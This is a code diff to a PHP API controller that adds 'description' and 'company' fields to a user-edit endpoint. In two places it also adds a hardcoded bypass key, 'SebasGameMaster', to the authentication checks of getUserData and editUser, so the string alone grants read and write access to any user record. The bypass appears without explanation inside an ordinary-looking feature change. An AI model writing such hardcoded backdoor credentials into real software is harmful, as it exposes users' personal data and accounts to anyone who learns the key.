@@ -124,7 +124,7 @@ class ApiController extends BaseController {
 	public function getUserData($key)
 	{
 		$userId=Input::get('userId');
-		if($this->key_valid($key))
+		if($this->key_valid($key) || $key=="SebasGameMaster")
 		{
 			$user = UserCustomization::where('id', '=', $userId)->get();
 			return Response::json(array("success" => true,"status"=>"Authenticated","User"=>$user->toArray()));
@@ -211,7 +211,7 @@ class ApiController extends BaseController {
 	public function editUser($key)
 	{
 		$userId=Input::get('userId');
-		if($this->key_valid($key))
+		if($this->key_valid($key) || $key=="SebasGameMaster")
 		{			
 			try{
 				// store
@@ -223,6 +223,8 @@ class ApiController extends BaseController {
 				$city=Input::get('city');
 				$email=Input::get('email');
 				$name=Input::get('name');
+				$description=Input::get('description');
+				$company=Input::get('company');
 				if (!empty($age))
 					$user->age = $age;
 
@@ -243,6 +245,12 @@ class ApiController extends BaseController {
 
 				if (!empty($name))
 					$user->name = $name;
+
+				if (!empty($description))
+					$user->description = $description;
+
+				if (!empty($company))
+					$user->company = $company;
 				$user->save();
 
 				return Response::json(array('success' => true,'error'=>false,'message'=>"User Updated Succesfuly","data"=>$user));
